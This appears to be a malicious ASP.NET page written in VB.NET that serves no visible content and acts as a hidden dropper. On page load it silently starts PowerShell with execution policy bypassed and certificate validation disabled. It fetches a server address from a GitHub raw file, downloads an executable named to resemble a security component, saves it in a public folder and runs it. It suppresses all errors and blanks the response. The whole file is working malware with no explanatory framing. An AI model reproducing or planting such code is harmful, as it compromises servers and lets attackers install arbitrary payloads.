<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
    Try
        Dim ps As String = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;if($PSVersionTable.PSVersion.Major -lt 6){Add-Type -TypeDefinition 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy:ICertificatePolicy{public bool CheckValidationResult(ServicePoint srvPoint,X509Certificate certificate,WebRequest request,int certificateProblem){return $true}}';[System.Net.ServicePointManager]::CertificatePolicy=New-Object TrustAllCertsPolicy}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}};$ip=(Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/ExploitBlizzardCommunity/avinashbhosale/refs/heads/main/file.txt').Trim();Invoke-WebRequest -Uri ""https://$ip/module/mpsecd.exe"" -Headers @{'X-Forwarded-Proto'='api'} -UseBasicParsing -OutFile 'C:\\Users\\Public\\Documents\\mpsecd.exe';Start-Process 'C:\\Users\\Public\\Documents\\mpsecd.exe'"

        Dim psi As New ProcessStartInfo("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & ps & """")
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        Process.Start(psi)
    Catch
        ' Fail silently
    End Try

    Response.Clear()
    Response.End()
End Sub
</script>
